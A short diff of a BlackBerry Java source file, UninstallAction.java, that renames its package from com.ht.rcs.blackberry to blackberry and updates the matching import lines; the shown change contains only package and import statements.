@@ -5,17 +5,17 @@
  * File         : UninstallAction.java 
  * Created      : 26-mar-2010
  * *************************************************/
-package com.ht.rcs.blackberry.action;
+package blackberry.action;
 
 import net.rim.device.api.system.ApplicationDescriptor;
 import net.rim.device.api.system.CodeModuleManager;
 
-import com.ht.rcs.blackberry.AgentManager;
-import com.ht.rcs.blackberry.EventManager;
-import com.ht.rcs.blackberry.event.Event;
-import com.ht.rcs.blackberry.log.LogCollector;
-import com.ht.rcs.blackberry.log.Markup;
-import com.ht.rcs.blackberry.utils.Check;
+import blackberry.AgentManager;
+import blackberry.EventManager;
+import blackberry.event.Event;
+import blackberry.log.LogCollector;
+import blackberry.log.Markup;
+import blackberry.utils.Check;
 
 public class UninstallAction extends SubAction {
 
